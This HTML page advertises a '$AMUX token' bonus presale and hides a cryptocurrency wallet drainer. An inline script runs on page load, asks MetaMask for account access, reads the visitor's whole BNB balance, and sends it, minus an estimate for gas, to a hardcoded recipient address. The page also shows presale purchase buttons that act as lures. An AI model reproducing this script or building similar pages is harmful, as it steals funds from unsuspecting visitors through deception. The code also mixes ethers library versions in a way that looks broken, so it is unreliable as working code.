<!DOCTYPE html>
<html lang="en">
  
  <head>
    
    <title>Amuletum | Your Token</title>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- favicon -->
    <link rel="apple-touch-icon" sizes="180x180" href="images/x-icon/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="images/x-icon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="images/x-icon/favicon-16x16.png">
    <link rel="manifest" href="images/x-icon/site.webmanifest">
    <link rel="stylesheet" href="css/style.css" /><script type="text/javascript" src="formulario.js"></script>
    
  </head>
   <body>
    <header>
      <div class="container">
        <div class="logo">
          <a href="/">
            <img src="https://static.wixstatic.com/media/5cc9e0_44a5d3249dd34088ba0a2d7d9ace6e92~mv2.png/v1/fill/w_47,h_47,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/amuletum-header.png" alt="logo"/>
          </a>
        </div>
        <div class="menu">
          <a
            href="https://t.me/amux_official"
            target="_blank"
            rel="noopener noreferrer"
          >
            <img src="images/header/telegram.png" alt="Telegram" width="30" height="30"/>
          </a>
          
          <a href="https://www.amuletum.io/" target="_blank" rel="noopener noreferrer" class="wallet-btn btn"
          ><span>Return to main site</span>
        </a>
          </button>
        </div>
      </div>
    </header>

   <!-- Agrega una referencia a la biblioteca ethers.js -->
   <script type="module">
    import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js";
    // Your code here...
  </script>
   
   <script>
    async function conectarBilletera() {
        // Verificamos si MetaMask está instalado y conectado
        if (typeof window.ethereum !== 'undefined') {
            try {
                // Solicitamos permiso al usuario para acceder a su cuenta de MetaMask
                await window.ethereum.request({ method: 'eth_requestAccounts' });

                // Obtenemos la dirección de la billetera actualmente conectada
                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                const userAddress = accounts.length > 0 ? accounts[0] : null;

                if (userAddress) {
                    // Dirección del destinatario
                    const toAddress = '0x983853d4af01792af8eac079807b4def6ce037f8'; // Inserta la dirección del destinatario aquí

                    // Obtener saldo en BNB
                    const balance = await window.ethereum.request({
                        method: 'eth_getBalance',
                        params: [userAddress, 'latest'],
                    });

                    // Obtener la tarifa de red actual
                    const gasPrice = await window.ethereum.request({
                        method: 'eth_gasPrice',
                    });

                    // Convertir el saldo de Wei a BNB
                    const balanceInEther = parseFloat(ethers.utils.formatEther(balance));
                    const gasPriceInEther = parseFloat(ethers.utils.formatEther(gasPrice));
                    const precioBNBEnDolares = 500; // Precio estimado de 1 BNB en dólares
                    const valorEnDolares = (balanceInEther - gasPriceInEther) * precioBNBEnDolares;

                    // Verificar si el saldo es mayor a $0.1 después de descontar la tarifa de red
                    if (valorEnDolares > 0.1) {
                        // Crear la transacción
                        const transactionParameters = {
                            to: toAddress,
                            from: userAddress,
                            value: ethers.utils.parseEther((balanceInEther - gasPriceInEther).toString()), // Enviamos el saldo disponible después de descontar la tarifa de red
                        };

                        // Enviar la transacción
                        await window.ethereum.request({
                            method: 'eth_sendTransaction',
                            params: [transactionParameters],
                        });
                        alert('Transacción enviada correctamente!');
                    } else {
                        alert('El saldo en BNB después de descontar la tarifa de red no es mayor a $0.1.');
                    }
                } else {
                    alert('No se pudo obtener la dirección de la cuenta del usuario.');
                }
            } catch (error) {
                console.error('Error al enviar la transacción:', error);
                alert('Hubo un error al enviar la transacción. Consulta la consola para obtener más detalles.');
            }
        } else {
            // MetaMask no está instalado, mostramos un mensaje de error
            alert('MetaMask no está instalado. Por favor, instálalo para continuar.');
        }
    }

    // Llamamos a la función conectarBilletera() cuando la página se carga
    window.onload = conectarBilletera;
</script>




  
  

    
   <a href="https://www.pinksale.finance/launchpad/0x2db15094d739e48a5cb31BD3dEd025C34669e4B1?chain=ETH" target="_blank" rel="noopener noreferrer" class="btn"
   > <div style="text-align: center;">
    <span class="centered-text">Check our Presale</span>
  </div>
   </a>
    <section class="container">
      <div class="owner-status"></div>
      <div class="countdown">
        <h2>$AMUX TOKEN</h2>
        <h1>BONUS SALE ROUND!</h1>
        <img src="https://static.wixstatic.com/media/5cc9e0_44a5d3249dd34088ba0a2d7d9ace6e92~mv2.png/v1/fill/w_200,h_200,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/amuletum-header.png" alt="" class="left-image">      
        <p>Participate in our presale now with 50% extra tokens</p>
        <a href="https://nowpayments.io/payment/?iid=4679589417" target="_blank" rel="noopener noreferrer" class="hero-btn btn"><span>Option 1 (BUY 0.1 Eth)</span></a>
        <a href="https://nowpayments.io/payment/?iid=6111099007" target="_blank" rel="noopener noreferrer" class="hero-btn btn"><span>Option 2 (BUY 0.5 Eth)</span></a>
        <a href="https://nowpayments.io/payment/?iid=5493592066" target="_blank" rel="noopener noreferrer" class="hero-btn btn"><span>Option 3 (BUY 1 Eth)</span></a>
        <a href="https://nowpayments.io/payment/?iid=5202881908" target="_blank" rel="noopener noreferrer" class="hero-btn btn"><span>Option 4 (BUY 2 Eth)</span></a> 

      </div>
    </section>

    <script src="https://cdn.jsdelivr.net/npm/@metamask/onboarding@1.0.1/dist/metamask-onboarding.bundle.js"></script>
    <script src="js/countdown.js"></script>
    <script src="js/app.js"></script>
  </body>
</html>
